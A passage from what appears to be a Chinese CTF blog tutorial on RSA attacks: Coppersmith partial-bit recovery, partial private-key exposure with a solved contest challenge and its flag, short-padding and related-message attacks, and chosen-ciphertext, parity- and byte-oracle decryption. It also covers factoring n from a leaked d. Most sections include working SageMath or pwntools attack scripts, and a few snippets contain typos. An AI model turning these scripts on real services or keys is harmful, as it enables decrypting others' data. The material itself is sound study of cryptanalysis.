2^kbits范围内求解小根，beta为1和上述分析的beta一致，也就是对应factor为N</span><br><span class="line">print(x0)</span><br></pre></td></tr></table></figure><h4><span id="pyi-zhi-ming-wen-di-wei">已知明文低位</span><a href="#pyi-zhi-ming-wen-di-wei" class="header-anchor">#</a></h4><p>将构造的函数改为以下即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f &#x3D; ((m0 + ZmodN((pow(2,m0.nbits())))*x)^e) - c</span><br></pre></td></tr></table></figure><blockquote><p>当然,如果是明文的中间部分bit未知，也是相同的去修改对应的多项式f(x)即可，具体题目见https://cryptohack.org/challenges/rsa/ 中的Null or Never题目（Coppersmith是该题的一种解法）</p></blockquote><h2><span id="pyi-zhi-bu-fen-p-gong-ji">已知部分p攻击</span><a href="#pyi-zhi-bu-fen-p-gong-ji" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>已知$p=p0+x$,且$|x|&lt;N^{1/4}$时，也就是知道$p$的大约一半bits信息时，可以得到对应的$x$，从而对$N$进行分解</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>此时根据$p=p0+x0$我们知道$p0 = x0 \mod p$，所以可以列出多项式$f(x)= p0-x \mod p，f(x_0)=0 \mod p$</p><p>对应到引理中，显然$b=p$，由于在$RSA$中，$p和q$经常为同比特的素数，所以设置$beta=0.4，0.3$等都可</p><h4><span id="pyi-zhi-p-gao-wei">已知p高位</span><a href="#pyi-zhi-p-gao-wei" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n &#x3D; </span><br><span class="line">p0 &#x3D; # 已知的p的高位</span><br><span class="line">kbits &#x3D; </span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; x + p0</span><br><span class="line">f &#x3D; f.monic()</span><br><span class="line">x0 &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;0.3)[0] # beta&#x3D;0.3表明存在factor 大于n ^0.3</span><br><span class="line">print(x0 + p0)</span><br></pre></td></tr></table></figure><h4><span id="pyi-zhi-p-di-wei">已知p低位</span><a href="#pyi-zhi-p-di-wei" class="header-anchor">#</a></h4><p>同样的，已知p低位或者中间部分未知，修改对应的f(x)的表达式即可，例如已知p低位，则</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ZmodN&#x3D;Zmod(n)</span><br><span class="line">f(x) &#x3D; x*ZmodN(pow(2,p0.nbits()))+p0</span><br></pre></td></tr></table></figure><h2><span id="pbu-fen-si-yao-bao-lu-gong-ji">部分私钥暴露攻击</span><a href="#pbu-fen-si-yao-bao-lu-gong-ji" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>当已知私钥的部分bit信息，私钥$d=d0+x$，$d0$ 的bit数目约为$d$的$1/4$时，可以恢复私钥$d$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>根据论文《An Attack on RSA Given a Small Fraction of the Private Key Bits》</p><p>假设私钥$d$的bit数目为$kbits$,且已知的是私钥的低位</p><p>那么我们可以知道$d0 = d \mod 2^{kbits}$</p><p>所以有$ed0=1+k(N-s+1)\mod 2^{kbits},(s=p+q)$</p><p>所以我们可以通过解$ed0x-kx(N-x+1)= x \mod 2^{kbits}$ 得到可能的$s \mod 2^{kbits}$的值，继续通过求解$ p^2-sp+N=0 \mod 2^{kbits}$，就能得到$p \mod 2^{kbits}$的值了，进而把问题转换为已知部分$p$攻击。下面这个日本大哥的脚本是把1、2两步结合起来列式了，所以只求一个方程解出了部分$p$</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def partial_p(p0, kbits, n):</span><br><span class="line">    PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    nbits &#x3D; n.nbits()</span><br><span class="line"></span><br><span class="line">    f &#x3D; 2^kbits*x + p0</span><br><span class="line">    f &#x3D; f.monic()</span><br><span class="line">    roots &#x3D; f.small_roots(X&#x3D;2^(nbits&#x2F;&#x2F;2-kbits), beta&#x3D;0.3)  # find root &lt; 2^(nbits&#x2F;&#x2F;2-kbits) with factor &gt;&#x3D; n^0.3，在实际使用脚本的时候可以自己手动改nbits等参数，理解了原理再看脚本就很清楚明了了</span><br><span class="line">    if roots:</span><br><span class="line">        x0 &#x3D; roots[0]</span><br><span class="line">        p &#x3D; gcd(2^kbits*x0 + p0, n)</span><br><span class="line">        return ZZ(p)</span><br><span class="line"></span><br><span class="line">def find_p(d0, kbits, e, n):</span><br><span class="line">    X &#x3D; var(&#39;X&#39;)</span><br><span class="line"></span><br><span class="line">    for k in xrange(1, e+1):</span><br><span class="line">        results &#x3D; solve_mod([e*d0*X - k*X*(n-X+1) + k*n &#x3D;&#x3D; X], 2^kbits)</span><br><span class="line">        for x in results:</span><br><span class="line">            p0 &#x3D; ZZ(x[0])</span><br><span class="line">            p &#x3D; partial_p(p0, kbits, n)</span><br><span class="line">            if p:</span><br><span class="line">                return p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    n &#x3D;</span><br><span class="line">    e &#x3D; </span><br><span class="line">    d0 &#x3D; </span><br><span class="line">		kbits &#x3D; # 未知的d的bits数目</span><br><span class="line">    p &#x3D; find_p(d0, kbits, e, n)</span><br><span class="line">    print(&quot;found p: %d&quot; % p)</span><br><span class="line">    q &#x3D; n&#x2F;&#x2F;p</span><br><span class="line">    print(inverse_mod(e, (p-1)*(q-1)))</span><br></pre></td></tr></table></figure><p>如果将1、2两步分开列式，则修改函数<code>find_p</code>如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def find_p(d0, kbits, e, n):</span><br><span class="line">    X &#x3D; var(&#39;X&#39;)</span><br><span class="line">    for k in range(1, e+1):</span><br><span class="line">        results &#x3D; solve_mod([e*d0*X - k*X*(n-X+1)&#x3D;&#x3D; X], 2^kbits)</span><br><span class="line">        for x in results:</span><br><span class="line">            s &#x3D; ZZ(x[0])</span><br><span class="line">            pvar &#x3D; var(&#39;p&#39;)</span><br><span class="line">            p_results &#x3D; solve_mod([pvar*pvar-s*pvar+n&#x3D;&#x3D;0],2^kbits)</span><br><span class="line">            for p0 in p_results:</span><br><span class="line">                p0 &#x3D; ZZ(p0[0])</span><br><span class="line">                p &#x3D; partial_p(p0, kbits, n)</span><br><span class="line">                if p:</span><br><span class="line">                    return p</span><br></pre></td></tr></table></figure><p>但是速度上好像慢一些。</p><blockquote><p>同样的已知d高位等也可以进行求解，例如已知d高位，那么第一步解出来的其实是可能的p的低位，所以在解部分p时，修改f = (2^kbits)*x + p0即可</p></blockquote><h3><span id="pli-ti-2020-tian-yi-bei-hardrsa">例题：2020 天翼杯 hardRSA</span><a href="#pli-ti-2020-tian-yi-bei-hardrsa" class="header-anchor">#</a></h3><p>题目脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># chall.py</span><br><span class="line"># flag&#123;6809781d08e120627e623dcdafe26b8a&#125;</span><br><span class="line">p &#x3D; getPrime(510)</span><br><span class="line">q &#x3D; getPrime(510)</span><br><span class="line">r &#x3D; getPrime(510)</span><br><span class="line">e &#x3D; 7</span><br><span class="line">m &#x3D; bytes_to_long(os.urandom(30) + flag)</span><br><span class="line">n &#x3D; p * q * r</span><br><span class="line">d &#x3D; invert(e, (p - 1) * (q - 1) * (r - 1))</span><br><span class="line">c &#x3D; pow(m, e, n)</span><br><span class="line">print(n &#x2F;&#x2F; p)</span><br><span class="line">print(p)</span><br><span class="line">print(c)</span><br><span class="line">print(hex(d % (1 &lt;&lt; 540)))</span><br></pre></td></tr></table></figure><p>从题目看也是<code>Coppersmith partial d</code>的情况，只是这里由于$n$由$p、q、r$三个素数组成，因此需要我们重新推导同余方程</p><p>已知：$kbits = 540$、$p$、$qr$、$d_0$的值，$d_0 = d \mod 2^{kbits}$</p><p>推导如下：<br>$$<br>\begin{align*}<br>ed_0<br>&amp; = 1 +k(p-1)(q-1)(r-1) \<br>&amp; = 1+ k(pq-p-q+1)(r-1) \<br>&amp; = 1+k(pqr-pr-qr-1-pq+p+q+r) \<br>&amp; = 1+k(N-p(r+q)+s-qr-1) \<br>&amp; = 1+k(N-p(r+q)+(r+q)+p-qr-1) \<br>&amp; = 1+k(N-ps+s+p-qr-1) \<br>&amp; = 1+k(p-1)(qr-s+1)\mod 2^{kbits},(s=q+r) \tag{1}<br>\end{align*}<br>$$<br>通过上式可以求得所有的$s \mod 2^{kbits}$的值，同时我们知道<br>$$<br>q^2-sq+qr = 0 \mod 2^{kbits} \tag{2}<br>$$<br>联立公式$1 \times q$和公式$2 \times k(p-1)$，可以得到公式</p><p>$$ed_0q = q + kq(p-1)(qr-s+1) \tag{3}$$</p><p>$$k(p-1)qr = kq(p-1)(s-q) \tag{4}$$</p><p>相加得到：</p><p>$$ed_0q + k(p-1)qr = q+kq(p-1)(qr-q+1)$$</p><p>即：</p><p>$$ed_0q + k(p-1)qr-k(p-1)q(qr-q+1) = q \mod 2^{kbits}$$</p><p>解上述同余方程，即可得到$q \mod 2^{kbits}$</p><p>由于$kbits=540$，而$q$只有$510 bits$，所以解出来的就是可能的$q$的值，再通过$qr % q==0$过滤即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def find_q(d0, kbits, e, qr, p):</span><br><span class="line">    X &#x3D; var(&#39;X&#39;)</span><br><span class="line">    for k in range(1, e + 1):</span><br><span class="line">        temp &#x3D; k*(p-1)</span><br><span class="line">        results &#x3D; solve_mod([e*d0*X+temp*qr-temp*X*(qr-X+1)&#x3D;&#x3D;X], 2 ^ kbits)</span><br><span class="line">        for x in results:</span><br><span class="line">            q &#x3D; ZZ(x[0])</span><br><span class="line">            if qr % q &#x3D;&#x3D; 0:</span><br><span class="line">                return q</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    qr &#x3D; 6857671284539062742975668483013695756136974308830302383869017675211748459038460434623218652374536550644287079851235538790745857383008797698872874798021995947967308637270510423795384863442755166813716746318469915880844736019524077541319597047087620854791342900521099848683663304636436936596021386279685708537</span><br><span class="line">    p &#x3D; 2141698433991046082370939321691850154692026423424010392532982575546199921995522418737105878977898158159119041866620684371362271661642476751663585379591337</span><br><span class="line">    c &#x3D; 4329606906986929520922207896899782825966852252045645553852666134465727605375552409314262439896695961792039946511877813768609658516837096110397826574615865145364406310497152725490038135469839136190625952342503082553246584871237205558902774064100332461452316195663446307120094941991930964324406679011451626126064494215289724959537793057773764253924636259378833228904446486925068109314698993641720938647836132806653451109926428309922461595730642461604303078237048</span><br><span class="line">    d0 &#x3D; 0x8e6f66a517d9c8a610eb65dac5a613e72d47a29beaa5c77a9eb857e0db5d09eadf3a317776fdf27b0d85db0b6677afc8e0683d6dc2b4580281b6e99c3050f649213c37</span><br><span class="line">    e &#x3D; 7</span><br><span class="line">    kbits &#x3D; 540</span><br><span class="line">    q &#x3D; find_q(d0, kbits, e, qr, p)</span><br><span class="line">    print(q)</span><br><span class="line">    # q &#x3D; 2505948797318027758820680066583904581437202552654881626817593379353882875609223855015707273771918291251411562855290697544161987271016184806489110771554269</span><br></pre></td></tr></table></figure><h2><span id="pshort-padding-attack">short padding attack</span><a href="#pshort-padding-attack" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p><code>Short padding attack</code>经常和 相关消息攻击结合(<a href="https://blog.ycdxsb.cn/2decc525.html#more">https://blog.ycdxsb.cn/2decc525.html#more</a>)使用</p><p>我们已知$c_1 = m^e \mod n$，$c_2 = (m+padding)^e \mod n $，但我们不知道具体的<code>padding</code>值是多少</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>首先通过<code>short padding attack</code> 求出<code>padding</code>的值，然后再使用相关消息攻击求得消息$m$</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def short_pad_attack(c1, c2, e, n):</span><br><span class="line">    PRxy.&lt;x,y&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 &#x3D; x^e - c1</span><br><span class="line">    g2 &#x3D; (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 &#x3D; g1.change_ring(PRZZ)</span><br><span class="line">    q2 &#x3D; g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h &#x3D; q2.resultant(q1)</span><br><span class="line">    h &#x3D; h.univariate_polynomial()</span><br><span class="line">    h &#x3D; h.change_ring(PRx).subs(y&#x3D;xn)</span><br><span class="line">    h &#x3D; h.monic()</span><br><span class="line"></span><br><span class="line">    kbits &#x3D; n.nbits()&#x2F;&#x2F;(2*e*e)</span><br><span class="line">    diff &#x3D; h.small_roots(X&#x3D;2^kbits, beta&#x3D;0.5)[0]  # find root &lt; 2^kbits with factor &gt;&#x3D; n^0.5</span><br><span class="line"></span><br><span class="line">    return diff</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def related_message_attack(c1, c2, diff, e, n):</span><br><span class="line">    PRx.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    g1 &#x3D; x^e - c1</span><br><span class="line">    g2 &#x3D; (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    def gcd(g1, g2):</span><br><span class="line">        while g2:</span><br><span class="line">            g1, g2 &#x3D; g2, g1 % g2</span><br><span class="line">        return g1.monic()</span><br><span class="line"></span><br><span class="line">    return -gcd(g1, g2)[0]</span><br></pre></td></tr></table></figure><h2><span id="pcan-kao-lian-jie">参考链接</span><a href="#pcan-kao-lian-jie" class="header-anchor">#</a></h2><ul><li><a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks</a></li><li><a href="http://inaz2.hatenablog.com/entry/2016/01/20/022936" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2016/01/20/022936</a></li><li><a href="https://www.davidwong.fr/papers/david_wong_rsa_lll_boneh_durfee__2015.pdf" target="_blank" rel="noopener">https://www.davidwong.fr/papers/david_wong_rsa_lll_boneh_durfee__2015.pdf</a></li><li><a href="https://zhuanlan.zhihu.com/p/161622928" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/161622928</a></li><li><a href="https://cryptohack.org/challenges" target="_blank" rel="noopener">https://cryptohack.org/challenges</a></li><li><a href="https://link.springer.com/content/pdf/10.1007/3-540-49649-1_3.pdf" target="_blank" rel="noopener">https://link.springer.com/content/pdf/10.1007/3-540-49649-1_3.pdf</a></li><li><a href="https://crypto.sqrt-1.me/" target="_blank" rel="noopener">https://crypto.sqrt-1.me/</a></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中的RSA基本套路(2)</title>
    <url>/7bb662a3.html</url>
    <content><![CDATA[<blockquote><p>第二部分主要是一些Oracle相关的内容</p></blockquote><p>依赖库：</p><ul><li>gmpy2</li><li>pycrypto</li><li>pwntools</li><li>sage</li></ul><a id="more"></a><h2><span id="pxuan-ze-mi-wen-gong-ji">选择密文攻击</span><a href="#pxuan-ze-mi-wen-gong-ji" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>假设$Alice$创建密文$C=P^e \mod n$，并发送给$Bob$，并且我们有一次选择密文进行解密的机会，此时我们可以拦截$C$，并通过选择密文攻击，求出$P$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><ol><li>选择任意一个$G(n)$内与$n$互素的$X$(一般就是2啦)</li><li>计算$Y=C \times X^e \mod n$</li><li>由于选择密文攻击，将$Y$作为密文我们可以得到$Z=Y^d \mod n $</li><li>最后由于<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132819.jpg" alt="image-20200711200846750"><br>可以通过逆元求出$P$</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from gmpy2 import invert</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">p &#x3D; remote(ip,port)</span><br><span class="line">C &#x3D; </span><br><span class="line">n &#x3D; </span><br><span class="line">e &#x3D; </span><br><span class="line">X &#x3D; 2</span><br><span class="line">X_e &#x3D; pow（X,e,n)</span><br><span class="line">p.sendline(str((X_e*c)%n)</span><br><span class="line">Z &#x3D; int(p.recvline())</span><br><span class="line">result &#x3D; (Z*long(invert(X,n)))%n</span><br><span class="line">print(long_to_bytes(result))</span><br></pre></td></tr></table></figure><h2><span id="pparity-oracle">parity oracle</span><a href="#pparity-oracle" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>假设存在一个 $Oracle$，它会对一个给定的密文进行解密，并且会检查解密的明文的奇偶性，并根据奇偶性返回相应的值，比如 1 表示奇数，0 表示偶数。那么给定一个加密后的密文，我们只需要 $log(N)$ 次就可以知道这个密文对应的明文消息</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>假设$C=P^e \mod N$</p><p>第一次我们发送$C\times 2^e = (2P)^e \mod N$给服务器，服务器会返回$2P\mod N$</p><p>我们知道：</p><ul><li>$2P$是偶数，因此$(2P)^e$也是偶数</li><li>$N$是奇数（不考虑存在因子为2时）</li></ul><p>那么：</p><ul><li>服务器返回奇数时，说明$2P&gt;N$，且减去了奇数个$N$同时我们又知道$P&lt;N$，即$N/2 \leq P &lt; N$</li><li>服务器返回偶数时，说明$0\leq P &lt; N/2$</li></ul><p><strong>归纳</strong>：</p><p>假设第$i$次时，我们有</p><p>$$xN/2^i \leq P &lt; (x+1)N/2^i$$</p><p>在第$i+1$次时，我们可以得到</p><p>$$2^{i+1}P\mod N=2^{i+1}P-kN$$</p><p>$$0\leq 2^{i+1}P-kN &lt;N$$</p><p>$$kN/2^{i+1} \leq P &lt; (k+1)N/2^{i+1}$$</p><p>根据第$i$次结果我们分子分母同乘2，有</p><p>$$2xN/2^{i+1} \leq P &lt; 2(x+1)N/2^{i+1}$$</p><p>那么：</p><ul><li>服务器返回奇数，则$ k$ 必然是一个奇数，$k=2y+1$， 那么 $(2 y N+N) / 2^{i+1} \leq P&lt;(2 y N+2 N) / 2^{i+1}$。与此同时，由于 $P$ 必然存在，所以第 $i+1$ 得到的这个范围和第$ i$ 次得到的范围必然存在交集。所以$ y$ 必然与$ x $相等。</li><li>服务器返回偶数，则$ k$ 必然是一个偶数，$k=2y$，此时 $y $必然也与 $x $相等，那么$2 x N / 2^{i+1} \leq P&lt;(2 x N+N) / 2^{i+1}$</li></ul><p>总结：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lb = <span class="number">0</span></span><br><span class="line">ub = N</span><br><span class="line"><span class="keyword">if</span> server returns <span class="number">1</span></span><br><span class="line">    lb = (lb+ub)/<span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ub = (lb+ub)/<span class="number">2</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time,decimal,binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c1)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.sendline(str(c1))</span><br><span class="line">    res = int(p.recvuntil(<span class="string">"\n"</span>).strip())</span><br><span class="line">    <span class="keyword">if</span> res == <span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">assert</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> c_of_2</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  </span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext  </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext </span><br><span class="line">        c = (c * c_of_2) % n  </span><br><span class="line">        print(i,flag,int(upper - lower))</span><br><span class="line">    <span class="keyword">return</span> int(upper) </span><br><span class="line">  </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line">c_of_2 = pow(<span class="number">2</span>,e,n)</span><br><span class="line">m = partial((c * c_of_2) % n, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2><span id="pbyte-oracle">byte oracle</span><a href="#pbyte-oracle" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>假设目前存在一个$ Oracle$，它会对一个给定的密文进行解密，并且会给出明文的最后一个字节。那么给定一个加密后的密文，我们只需要 $log_{256}n$ 次就可以知道这个密文对应的明文消息。</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>是parity oracle的扩展，此时泄露一个byte，因此我们将原来的发送$C\times 2^e$改成$C\times 256 ^e$即可</p><p>已知</p><p>$$C=P^e \mod N$$</p><p>第一次我们发送</p><p>$$C\times 256^e = (256P)^e \mod N$$</p><p>服务器返回$256P \mod N$</p><p>此时有：</p><ul><li>$256P$为偶数</li><li>$N$为奇数</li></ul><p>由于$P&lt;N$,我们有$256P \mod N=256P -kN(k&lt;256)$，并且对于不同的$k_1，k_2$,我们有$256P-k_1 n \not\equiv 256P-k_2 n \mod 256$</p><p>由于是模$256$，所以$256P-kn \equiv -kn \mod 256$，因此我们首先可以枚举$0-255$情况下的最后一个字节，并得到映射表</p><p>当服务器返回最后一个字节b，我们就可以通过映射表得到$k$，即减去了$k$个$N$，有$kN \leq 256P \leq (k+1)N$</p><p><strong>归纳</strong>：</p><p>假设在第$i$次时，有</p><p>$$xN/256^i \leq P &lt; (x+1)N/256^i$$</p><p>当第$i+1$次时，发送$C*256^{(i+1)e}$，服务器返回</p><p>$$256^{i+1}P \mod N = 256^{i+1}P-kN$$</p><p>$$0\leq 256^{i+1}P-kN&lt;N$$</p><p>$$kN/256^{i+1}\leq P&lt;256(x+1)N/256^{i+1}$$</p><p>总结：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lb = <span class="number">0</span></span><br><span class="line">ub = N</span><br><span class="line">k = mab[b]</span><br><span class="line">interval = (ub-lb)/<span class="number">256</span></span><br><span class="line">lb = lb + interval * k</span><br><span class="line">ub = lb + interval</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">e =</span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line">print(<span class="string">"e:"</span>,e)</span><br><span class="line">print(<span class="string">"c:"</span>,c)</span><br><span class="line">print(<span class="string">"n:"</span>,n)</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    d[(-k*n)%<span class="number">256</span>] = k</span><br><span class="line">print(d)</span><br><span class="line">lb = <span class="number">0</span></span><br><span class="line">ub = n</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    m = (c * pow(<span class="number">256</span>,i*e,n)) %n</span><br><span class="line">    p.sendline(str(m))</span><br><span class="line">    b = int(p.recvline())</span><br><span class="line">    k = d[b]</span><br><span class="line">    interval = int((ub-lb)/<span class="number">256</span>)</span><br><span class="line">    lb = lb + interval * k</span><br><span class="line">    ub = lb + interval</span><br><span class="line">    print(<span class="string">"ub-lb:"</span>,ub-lb)</span><br><span class="line">print(<span class="string">"lb:"</span>,lb)</span><br><span class="line">print(<span class="string">"ub:"</span>,ub)</span><br><span class="line">i = lb</span><br><span class="line"><span class="comment"># 没控制好边界，所以最后暴力一段</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;=lb+<span class="number">30000</span>):</span><br><span class="line">    m = pow(i,e,n)</span><br><span class="line">    <span class="keyword">if</span>(m==c):</span><br><span class="line">        print(<span class="string">"result:"</span>,i)</span><br><span class="line">        p.sendline(str(i))</span><br><span class="line">        print(p.recvline())</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">print(<span class="string">"no result"</span>)</span><br></pre></td></tr></table></figure><h2><span id="pd-xie-lu-gong-ji">d泄露攻击</span><a href="#pd-xie-lu-gong-ji" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>题目同时给出了$d$、$e$和$N$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>我们知道$ed \equiv 1\mod \varphi(n)$，则存在$k$，使得</p><p>$$ed-1 = k \varphi(n)$$</p><p>又有$\forall a \in Z^{*}_n $，满足$a^{ed-1} \equiv 1 \mod n$，令</p><p>$$ed-1 = 2^s t$$</p><p>其中，$t$是一奇数，可以证明对于至少一半的$\forall a \in Z^{*}_n $，存在一个$i \in [1,s]$，使得</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132835.jpg" alt="image-20200711202601842"></p><p>成立，如果$a,i$满足上述条件，可以对$n$进行暴力分解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> fractions,random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_modulus</span><span class="params">(n, d, e)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Efficiently recover non-trivial factors of n</span></span><br><span class="line"><span class="string">    See: Handbook of Applied Cryptography</span></span><br><span class="line"><span class="string">    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)</span></span><br><span class="line"><span class="string">    http://www.cacr.math.uwaterloo.ca/hac/</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    t = (e * d - <span class="number">1</span>)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        quotient, remainder = divmod(t, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">        t = quotient</span><br><span class="line"></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        a = random.randint(<span class="number">1</span>,n<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> i &lt;= s <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">            c1 = pow(a, pow(<span class="number">2</span>, i<span class="number">-1</span>, n) * t, n)</span><br><span class="line">            c2 = pow(a, pow(<span class="number">2</span>, i, n) * t, n)</span><br><span class="line"></span><br><span class="line">            found = c1 != <span class="number">1</span> <span class="keyword">and</span> c1 != (<span class="number">-1</span> % n) <span class="keyword">and</span> c2 == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    p = fractions.gcd(c1<span class="number">-1</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br></pre></td></tr></table></figure><h2><span id="pn-duo-yin-zi">n多因子</span><a href="#pn-duo-yin-zi" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>当$n$由多个因子组成时</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" 